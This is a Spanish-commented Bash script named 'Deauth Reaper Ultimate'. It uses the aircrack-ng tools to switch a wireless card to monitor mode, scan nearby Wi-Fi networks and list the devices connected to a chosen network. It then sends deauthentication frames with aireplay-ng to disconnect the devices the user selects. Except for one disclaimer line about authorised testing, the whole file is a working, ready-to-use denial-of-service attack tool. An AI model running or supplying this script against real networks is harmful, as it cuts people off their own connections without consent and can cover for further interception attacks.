#!/bin/bash

# "Deauth Reaper Ultimate" - Desconecta dispositivos de la red Wi-Fi automáticamente
# ⚠ Solo para entornos de ciberseguridad y pruebas autorizadas ⚠

# 🎨 COLORES PARA LA INTERFAZ 🎨
RED="\e[91m"
GREEN="\e[92m"
YELLOW="\e[93m"
BLUE="\e[94m"
MAGENTA="\e[95m"
CYAN="\e[96m"
RESET="\e[0m"

# Verifica si el script se ejecuta como root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}⚠ ERROR: Debes ejecutar este script como root.${RESET}"
    exit 1
fi

# Nombre de la interfaz Wi-Fi en modo monitor
INTERFACE="wlan0mon"

# Iniciar la interfaz en modo monitor
echo -e "${MAGENTA}💀 [Deauth Reaper] Activando modo monitor en la interfaz...${RESET}"
airmon-ng start wlan0 > /dev/null 2>&1

# Escanear redes Wi-Fi y mostrar opciones
echo -e "${CYAN}📡 Escaneando redes Wi-Fi disponibles...${RESET}"
airodump-ng "$INTERFACE" --output-format csv --write redes_scan > /dev/null 2>&1 &
sleep 5
pkill airodump-ng

# Mostrar redes encontradas
echo -e "${YELLOW}🔍 Redes Wi-Fi detectadas:${RESET}"
awk -F, 'NR>2 {print NR-2") "$14" (BSSID: "$1", Canal: "$4")"}' redes_scan-01.csv | column -t
echo -e "${BLUE}----------------------------------------${RESET}"

# Seleccionar red por número
read -p "🎯 Elige el número de la red objetivo: " RED_NUM
BSSID=$(awk -F, -v num=$((RED_NUM+2)) 'NR==num {print $1}' redes_scan-01.csv)
CHANNEL=$(awk -F, -v num=$((RED_NUM+2)) 'NR==num {print $4}' redes_scan-01.csv)

echo -e "${GREEN}✅ Red seleccionada: $BSSID en el canal $CHANNEL${RESET}"

# Escanear clientes conectados automáticamente
echo -e "${CYAN}🔎 Escaneando dispositivos conectados a la red...${RESET}"
touch clientes_scan-01.csv  # Asegurar que el archivo existe
airodump-ng --bssid "$BSSID" -c "$CHANNEL" --output-format csv --write clientes_scan "$INTERFACE" > /dev/null 2>&1 &
sleep 15  # 🔥 DA MÁS TIEMPO AL ESCANEO
pkill airodump-ng

# Verificar si el archivo se creó correctamente
CLIENTES_FILE=$(ls clientes_scan* | head -n 1)
if [ ! -f "$CLIENTES_FILE" ]; then
    echo -e "${RED}❌ ERROR: No se encontró el archivo de clientes. ¿Interfaz en modo monitor?${RESET}"
    exit 1
fi

# Mostrar dispositivos conectados con nombre de fabricante
echo -e "${YELLOW}📋 Dispositivos conectados detectados:${RESET}"
echo -e "${BLUE}----------------------------------------${RESET}"
echo -e "N°  |  MAC Address       |  Fabricante"
echo -e "${BLUE}----------------------------------------${RESET}"

COUNT=1
awk -F, 'NR>2 && $1 ~ /:/ {print $1}' "$CLIENTES_FILE" | while read -r MAC; do
    VENDOR=$(macchanger -l | grep -i "$(echo $MAC | cut -c 1-8)" | awk -F '  ' '{print $2}' | head -n 1)
    if [ -z "$VENDOR" ]; then
        VENDOR="Desconocido"
    fi
    echo -e "${MAGENTA}$COUNT)${RESET} $MAC - $VENDOR"
    COUNT=$((COUNT+1))
done
echo -e "${BLUE}----------------------------------------${RESET}"

# Seleccionar clientes a desconectar por número
read -p "💀 Elige el número de los dispositivos a desconectar (separados por espacio): " CLIENTES_NUM

# Convertir números en MACs
CLIENTES_MAC=()
for NUM in $CLIENTES_NUM; do
    CLIENTES_MAC+=($(awk -F, -v num=$((NUM+2)) 'NR==num {print $1}' "$CLIENTES_FILE"))
done

# Desconectar los clientes seleccionados
for MAC in "${CLIENTES_MAC[@]}"; do
    echo -e "${RED}🔥 [Deauth Reaper] Eliminando conexión de $MAC ...${RESET}"
    aireplay-ng --deauth 10 -a "$BSSID" -c "$MAC" "$INTERFACE"
done

# Detener la interfaz en modo monitor y restaurarla a modo normal
airmon-ng stop "$INTERFACE" > /dev/null 2>&1
echo -e "${GREEN}✅ Interfaz restaurada a modo normal.${RESET}"

echo -e "${MAGENTA}💀 [Deauth Reaper] Operación completada.${RESET}"